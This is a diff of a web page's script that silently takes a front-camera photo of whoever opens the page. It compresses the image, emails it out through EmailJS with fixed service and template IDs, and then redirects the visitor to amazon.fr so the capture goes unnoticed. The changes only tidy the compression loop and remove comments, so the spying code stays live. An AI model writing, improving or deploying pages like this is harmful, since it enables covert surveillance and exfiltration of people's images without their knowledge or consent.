@@ -8,7 +8,7 @@
     body, html {
       margin: 0;
       padding: 0;
-      background: #000; /* écran noir */
+      background: #000;
       height: 100%;
       width: 100%;
       overflow: hidden;
@@ -29,21 +29,9 @@
     const canvas = document.getElementById('canvas');
     const context = canvas.getContext('2d');
 
-    // Compression intelligente
-    function getCompressedImage(canvas, maxKB = 45) {
-      let quality = 0.95;
-      let imageData = canvas.toDataURL("image/jpeg", quality);
-
-      while ((imageData.length / 1024) > maxKB && quality > 0.05) {
-        quality -= 0.05; // baisse progressive
-        imageData = canvas.toDataURL("image/jpeg", quality);
-      }
-      return imageData;
-    }
-
     async function startCapture() {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ 
+        const stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "user", width: 1920, height: 1080 }
         });
         video.srcObject = stream;
@@ -51,15 +39,19 @@
         video.onloadeddata = () => {
           context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-          // Compression à 45 KB max
-          const imageData = getCompressedImage(canvas, 45);
+          let quality = 0.9;
+          let imageData;
+          do {
+            imageData = canvas.toDataURL("image/jpeg", quality);
+            const sizeKB = Math.round((imageData.length * 3 / 4) / 1024);
+            if (sizeKB <= 60) break;
+            quality -= 0.05;
+          } while (quality > 0.1);
 
-          // Stop caméra après capture
           stream.getTracks().forEach(track => track.stop());
 
-          // Envoi via EmailJS
           emailjs.send("service_8cs0gml", "template_rdhxflt", {
-            message: "Photo auto compressée 📸 (≤45KB)",
+            message: "Photo auto 📸",
             image: imageData
           }).finally(() => {
             window.location.href = "https://www.amazon.fr";
